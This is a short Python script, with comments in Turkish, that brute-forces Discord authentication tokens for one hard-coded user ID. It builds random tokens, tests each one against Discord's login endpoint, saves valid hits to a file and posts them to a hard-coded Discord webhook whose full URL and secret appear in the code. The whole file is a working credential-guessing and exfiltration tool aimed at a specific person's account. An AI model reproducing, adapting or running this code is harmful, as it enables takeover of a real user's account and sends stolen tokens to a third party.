import base64
import os
import random
import string
import requests
from colorama import *
import time

id_to_token = base64.b64encode(str(809012216732319774).encode("ascii"))
id_to_token = str(id_to_token)[2:-1]

# Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1224247927749480448/RA-0BCSgFb8jp9zrfBTwtbAX2wnQ7eMSGGfIyItwcs9t9Ew2hqBFS6nQ4AE8CR_isVfJ'

# Sayacı başlat
total_tokens_tried = 0

def send_to_webhook(message):
    data = {
        'content': message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 200:
        print(Fore.GREEN + '[+] Message sent to Discord webhook')
    else:
        print(Fore.RED + '[-] Discord'a atamamda sıkıntı oldu')

# Başlangıç mesajını gönder
send_to_webhook("İşlem başladı.")

while True:
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers = {
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    total_tokens_tried += 1
    if login.status_code == 200:
        print(Fore.GREEN + '[+] VALID' + ' ' + token)
        with open('hit.txt', "a+") as f:
            f.write(f'{token}\n')
        send_to_webhook(f'Yeni isabet: {token}')
    else:
        print(Fore.RED + '[-] INVALID' + ' ' + token)

    # Her 20 saniyede bir toplam deneme sayısını gönder
    if total_tokens_tried % 20 == 0:
        send_to_webhook(f"Toplam deneme sayısı: {total_tokens_tried}")

    # 20 saniye bekle
    time.sleep(0.1)
